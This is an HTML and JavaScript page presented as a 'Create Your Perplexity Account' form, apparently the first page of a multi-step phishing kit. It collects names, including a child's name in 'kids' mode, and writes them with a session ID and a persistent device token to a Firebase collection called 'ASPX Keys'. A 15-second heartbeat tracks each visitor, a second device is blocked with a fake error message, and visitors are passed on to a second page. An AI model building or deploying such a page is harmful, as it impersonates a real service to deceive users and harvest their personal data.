<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

<title>Create Your Perplexity Account</title>

<style>

*{
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}

body{
    margin:0;
    padding:0;
    display:flex;
    justify-content:center;
    background:#ffffff;
    color:#000000;
}

body.dark{
    background:#000000;
    color:#ffffff;
}

.container{
    width:100%;
    max-width:400px;
    padding:40px 24px;
    display:flex;
    flex-direction:column;
    align-items:center;
    text-align:center;
}

h1{
    font-size:32px;
    font-weight:bold;
    margin-bottom:8px;
    margin-top:40px;
    letter-spacing:-0.5px;
}

.subtitle{
    font-size:16px;
    color:#6e6e80;
    margin-bottom:40px;
}

body.dark .subtitle{
    color:#aaa;
}

.input-group{
    width:100%;
    position:relative;
    margin-bottom:16px;
    text-align:left;
}

.input-group label{
    position:absolute;
    top:-10px;
    left:12px;
    background:white;
    padding:0 4px;
    font-size:12px;
    color:#6e6e80;
    z-index:1;
}

body.dark .input-group label{
    background:#000;
    color:#aaa;
}

input{
    width:100%;
    padding:16px;
    font-size:16px;
    border:1px solid #d1d1d6;
    border-radius:24px;
    outline:none;
}

body.dark input{
    background:#000;
    color:#fff;
    border:1px solid #555;
}

input:focus{
    border-color:#000;
    border-width:2px;
}

body.dark input:focus{
    border-color:#fff;
}

.btn-continue{
    width:100%;
    background:#000;
    color:#fff;
    border:none;
    padding:14px;
    font-size:16px;
    font-weight:bold;
    border-radius:28px;
    cursor:pointer;
    margin-top:20px;
}

body.dark .btn-continue{
    background:#fff;
    color:#000;
}

.error{
    color:#d93025;
    font-size:12px;
    margin-top:5px;
    margin-left:15px;
    display:none;
}

.loading{
    opacity:0.7;
    pointer-events:none;
}

</style>
</head>

<body>

<div class="container">

    <h1 id="titleText">
        Create a Perplexity Account
    </h1>

    <p class="subtitle" id="subtitleText">
        Enter your name
    </p>

    <div class="input-group">

        <label id="firstNameLabel">
            First name
        </label>

        <input
            type="text"
            id="firstName"
            placeholder="First name"
            required
            autofocus
        >

        <div id="fnError" class="error">
            First name is required
        </div>

    </div>

    <div
        class="input-group"
        style="margin-top:10px;"
    >

        <label>
            Last name
        </label>

        <input
            type="text"
            id="lastName"
            placeholder="Last name (optional)"
        >

    </div>

    <button
        class="btn-continue"
        id="continueBtn"
    >
        Continue
    </button>

</div>

<script type="module">

/* ================= FIREBASE ================= */

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";

import {
    getFirestore,
    doc,
    setDoc,
    getDoc,
    updateDoc,
    serverTimestamp
}
from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

const firebaseConfig = {

    apiKey: "YOUR_API_KEY",

    authDomain: "YOUR_AUTH_DOMAIN",

    projectId: "YOUR_PROJECT_ID",

    storageBucket: "YOUR_STORAGE_BUCKET",

    messagingSenderId: "YOUR_MESSAGING_SENDER_ID",

    appId: "YOUR_APP_ID"

};

const app = initializeApp(firebaseConfig);

const db = getFirestore(app);

/* ================= THEME ================= */

function applyTheme(){

    const params =
        new URLSearchParams(
            window.location.search
        );

    const theme =
        params.get("theme");

    if(theme === "d"){

        document.body.classList.add("dark");

    }
    else if(theme === "l"){

        document.body.classList.remove("dark");

    }
    else{

        if(
            window.matchMedia(
                '(prefers-color-scheme: dark)'
            ).matches
        ){
            document.body.classList.add("dark");
        }

    }

}

applyTheme();

/* ================= SESSION ================= */

function initSession(){

    const params =
        new URLSearchParams(
            window.location.search
        );

    let session =
        params.get("session");

    let type =
        params.get("type") || "personal";

    let cont =
        params.get("continue") || "";

    if(!session){

        session = Math.floor(
            1000000000 +
            Math.random() * 9000000000
        ).toString();

        let newUrl =
            `${window.location.pathname}?session=${session}&type=${type}`;

        if(cont){

            newUrl +=
                `&continue=${encodeURIComponent(cont)}`;

        }

        window.history.replaceState(
            {},
            '',
            newUrl
        );

    }

    return {
        session,
        type,
        cont
    };

}

const {
    session,
    type,
    cont
} = initSession();

/* ================= TYPE UI ================= */

function applyTypeUI(){

    const t =
        type.toLowerCase();

    const subtitle =
        document.getElementById(
            "subtitleText"
        );

    const title =
        document.getElementById(
            "titleText"
        );

    const firstLabel =
        document.getElementById(
            "firstNameLabel"
        );

    if(t === "kids"){

        title.innerText =
            "Create Your Child Account";

        subtitle.innerText =
            "Enter Your Child’s Name";

        firstLabel.innerText =
            "Child first name";

        document
            .getElementById("firstName")
            .placeholder =
            "Child first name";

    }

    if(t === "business"){

        title.innerText =
            "Create Your Workspace";

        subtitle.innerText =
            "Enter your workspace owner name";

    }

}

applyTypeUI();

/* ================= DEVICE TOKEN ================= */

let deviceToken =
    localStorage.getItem(
        "DEVICE_TOKEN"
    );

if(!deviceToken){

    deviceToken =
        crypto.randomUUID() +
        "-" +
        Date.now();

    localStorage.setItem(
        "DEVICE_TOKEN",
        deviceToken
    );

}

/* ================= PAGE FLOW STORAGE ================= */

sessionStorage.setItem(
    "ACTIVE_SESSION",
    session
);

localStorage.setItem(
    "LAST_SESSION",
    session
);

/* ================= SECURITY ================= */

async function protectSession(){

    const sessionRef =
        doc(db, "ASPX Keys", session);

    const snap =
        await getDoc(sessionRef);

    /* ================= NEW USER ================= */

    if(!snap.exists()){

        await setDoc(
            sessionRef,
            {

                deviceToken,

                active:true,

                createdAt:serverTimestamp(),

                lastActive:serverTimestamp(),

                page:"1.html"

            },
            { merge:true }
        );

        return;

    }

    /* ================= EXISTING USER ================= */

    const data =
        snap.data();

    const dbToken =
        data.deviceToken || null;

    /* SAME DEVICE */

    if(dbToken === deviceToken){

        await updateDoc(
            sessionRef,
            {

                lastActive:serverTimestamp(),

                active:true,

                page:"1.html"

            }
        );

        return;

    }

    /* ================= BLOCK SECOND USER ================= */

    document.body.innerHTML = `

        <div style="
            height:100vh;
            display:flex;
            justify-content:center;
            align-items:center;
            padding:20px;
            text-align:center;
            font-family:Arial;
        ">

            <div>

                <h1 style="
                    font-size:34px;
                    margin-bottom:12px;
                ">
                    Something Went Wrong
                </h1>

                <p style="
                    color:gray;
                    font-size:16px;
                    line-height:1.7;
                ">
                    We Facing Some Issue While Working
                    With This Session ID Please Try Again Later
                </p>

            </div>

        </div>

    `;

    throw new Error(
        "Blocked second device"
    );

}

await protectSession();

/* ================= HEARTBEAT ================= */

async function heartbeat(){

    try{

        const sessionRef =
            doc(db, "ASPX Keys", session);

        await updateDoc(
            sessionRef,
            {

                lastActive:
                    serverTimestamp()

            }
        );

    }
    catch(e){
        console.log(e);
    }

}

setInterval(
    heartbeat,
    15000
);

/* ================= SUBMIT ================= */

async function submitData(){

    const btn =
        document.getElementById(
            "continueBtn"
        );

    btn.classList.add(
        "loading"
    );

    btn.innerText =
        "Please wait...";

    const firstName =
        document
            .getElementById(
                "firstName"
            )
            .value
            .trim();

    const lastName =
        document
            .getElementById(
                "lastName"
            )
            .value
            .trim();

    const errorDiv =
        document.getElementById(
            "fnError"
        );

    if(!firstName){

        errorDiv.style.display =
            "block";

        btn.classList.remove(
            "loading"
        );

        btn.innerText =
            "Continue";

        return;

    }

    errorDiv.style.display =
        "none";

    const t =
        type.toLowerCase();

    let familyValue =
        "no";

    if(t === "kids"){
        familyValue = "commit";
    }

    if(t === "business"){
        familyValue = "workspace";
    }

    try{

        await setDoc(

            doc(
                db,
                "ASPX Keys",
                session
            ),

            {

                firstName,

                lastName,

                type:t,

                family:familyValue,

                continue:
                    cont || null,

                deviceToken,

                page:"1.html",

                active:true,

                updatedAt:
                    serverTimestamp(),

                lastActive:
                    serverTimestamp()

            },

            { merge:true }

        );

        /* ================= NEXT PAGE ================= */

        window.location.href =
            `2.html?session=${session}`;

    }
    catch(e){

        console.error(e);

        btn.classList.remove(
            "loading"
        );

        btn.innerText =
            "Continue";

    }

}

/* ================= CLEANUP ================= */

window.addEventListener(
    "beforeunload",
    async () => {

        try{

            const sessionRef =
                doc(
                    db,
                    "ASPX Keys",
                    session
                );

            await updateDoc(
                sessionRef,
                {

                    lastActive:
                        serverTimestamp()

                }
            );

        }
        catch(e){
            console.log(e);
        }

    }
);

/* ================= EVENTS ================= */

document
.getElementById("firstName")
.addEventListener(
    "keypress",
    (e) => {

        if(e.key === "Enter"){

            e.preventDefault();

            document
                .getElementById(
                    "lastName"
                )
                .focus();

        }

    }
);

document
.getElementById("lastName")
.addEventListener(
    "keypress",
    (e) => {

        if(e.key === "Enter"){

            e.preventDefault();

            submitData();

        }

    }
);

document
.getElementById("continueBtn")
.addEventListener(
    "click",
    submitData
);

</script>

</body>
</html>
